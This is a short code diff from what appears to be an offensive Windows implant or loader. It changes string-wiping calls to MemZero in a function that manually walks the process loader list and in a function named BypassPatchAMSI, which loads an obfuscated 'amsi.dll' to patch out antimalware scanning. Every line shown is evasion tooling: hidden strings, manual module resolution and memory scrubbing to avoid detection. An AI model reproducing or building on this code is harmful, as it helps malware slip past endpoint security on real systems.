@@ -186,18 +186,18 @@ PVOID LdrModuleSearch(
         StringConcatW( Name, Dll );
     }
 
-    OverwriteStringW( Dll );
+    MemZero( Dll, sizeof( Dll ) );
 
     do
     {
         if ( ! StringCompareIW( Name, Entry->BaseDllName.Buffer ) ) {
-            OverwriteStringW( Name );
+            MemZero( Name, sizeof( Name ) );
             return Entry->DllBase;
         }
         Entry = Entry->InLoadOrderLinks.Flink;
     } while ( Entry != FirstEntry );
 
-    OverwriteStringW( Name );
+    MemZero( Name, sizeof( Name ) );
     return NULL;
 }
 
@@ -845,7 +845,7 @@ BOOL BypassPatchAMSI(
     module[8] = HideChar('\0');
 
     hModuleAmsi = LdrModuleLoad( module );
-    OverwriteStringW( module );
+    MemZero( module, sizeof( module ) );
 
     PRINTF( "[+] Loaded asmi.dll: %p\n", hModuleAmsi );
 
